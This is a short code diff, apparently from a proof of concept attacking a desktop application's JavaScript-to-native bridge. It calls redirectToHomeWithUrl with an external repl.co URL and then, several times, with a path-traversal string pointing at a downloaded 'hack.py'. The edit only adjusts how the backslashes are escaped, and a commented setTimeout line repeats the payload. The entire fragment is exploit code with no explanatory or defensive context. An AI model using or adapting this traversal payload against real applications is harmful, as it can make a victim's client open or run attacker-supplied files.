@@ -5,12 +5,12 @@
                   
   
                    window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");                 
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
-                  window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                   window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+                  window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")
+
                    //setTimeout('window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py");alert();',3000)   
                  
                  
